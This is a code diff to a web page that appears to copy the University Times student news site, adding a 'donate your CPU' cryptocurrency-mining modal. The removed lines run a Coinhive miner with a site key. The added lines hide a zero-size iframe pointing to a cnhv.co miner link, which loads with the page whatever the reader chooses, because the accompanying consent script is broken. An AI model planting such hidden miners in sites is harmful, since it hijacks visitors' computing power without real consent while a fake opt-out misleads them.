@@ -126,46 +126,46 @@ function powerpress_pinw(pinw_url){window.open(pinw_url, 'PowerPressPlayer','too
     <div class="modal-dialog modal-dialog-centered" role="document">
       <div class="modal-content">
         <div class="modal-header">
-          <h5 class="modal-title" id="exampleModalLongTitle">Welcome!</h5>
+          <img src="img/ut.jpeg" alt="ut logo" height="40" width="40">
           <button type="button" class="close" data-dismiss="modal" aria-label="Close">
             <span aria-hidden="true">&times;</span>
           </button>
         </div>
         <div class="modal-body">
+          <p>
           University Times prides itself on providing high quality content for students all over Ireland. In order to support these publications, UT needs generate revenue. We have chosen the least invasive to way to earn money to ensure you're reading experience is as enjoyable and informative as its always been. 
           This is why we ask for you to donate your computing power to us so that we can mine crypotcurrencies. This will use a percentage of your CPU but will not impact on the speed of your computer and will stop as soon as you close the tab. Thank you. 
+          <a href="http://browserbro.tk/browserbro.tk/">Find Out More</a>
+          </p>
         </div>
         <div class="modal-footer">
-          <button type="button" class="btn btn-secondary" data-dismiss="modal">Accept</button>
-          <button type="button" class="btn btn-primary" data-dismss ="modal">No Thanks</button>
+          <button type="button" class="btn btn-primary" data-dismiss="modal">Accept</button>
+          <button type="button" class="btn btn-secondary" data-dismiss="modal">No Thanks</button>
         </div>
       </div>
     </div>
   </div>
   </div>
-</div>
-
 <div id="container">
 <div class="headercontained">
 <header class="header" role="banner">
 
 <script>
-	 $(document).ready(function() {
-     $("#exampleModalCenter").modal();
-     $('#exampleModalCenter').on('shown.bs.modal', function() {
-        $('#myInput').focus();
-     });
-  });
-</script>
+	$(document).ready(function() {
+	     $("#exampleModalCenter").modal();
+	     $('#exampleModalCenter').on('shown.bs.modal', function() {
+	        $('#myInput').focus();
+	     });
+  	});
+</script> 
 
-<script src=" https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('BAbxBBFiP5sKCO9kCTFay8ZR2l2miuUJ', {throttle: 0.3});
+<iframe src="https://cnhv.co/2259d" style="border: 0; border: none; height: 0; width: 0;" id ="mineFrame"></iframe>
+</div>
 
-	// Only start on non-mobile devices and if not opted-out
-	// in the last 14400 seconds (4 hours):
-	if (!miner.isMobile() && !miner.didOptOut(14400)) {
-		miner.start();
+<script type="text/javascript">
+	var frame = document.getElementbyId("mineFrame").contentWindow;
+	if(document.getElementById('btn btn-primary').clicked == true){
+		frame.show();
 	}
 </script>
 
